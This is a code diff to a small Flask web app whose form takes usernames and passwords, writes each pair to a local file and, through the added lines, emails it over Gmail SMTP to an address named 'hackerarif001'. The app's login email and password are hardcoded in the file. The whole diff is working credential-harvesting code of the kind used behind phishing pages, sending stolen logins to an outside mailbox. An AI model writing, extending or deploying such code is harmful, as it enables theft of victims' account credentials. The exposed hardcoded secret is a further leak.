@@ -1,10 +1,25 @@
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-
 from flask import Flask, request, render_template
 
+EMAIL_ADDRESS = "hackerarif001@gmail.com"
+EMAIL_PASSWORD = "dchoxydmykgpbxbz"
+
 app = Flask(__name__)
+
+def send_email(username, password):
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = EMAIL_ADDRESS
+    msg['Subject'] = "اطلاعات جدید فرم دریافت شد ✅"
+
+    body = f"Username: {username}\nPassword: {password}"
+    msg.attach(MIMEText(body, 'plain'))
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.send_message(msg)
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
@@ -13,6 +28,7 @@ def home():
         password = request.form.get('password')
         with open('saved.txt', 'a') as file:
             file.write(f"Username: {username} | Password: {password}\n")
+        send_email(username, password)
     return render_template('index.html')
 
 @app.route('/show')
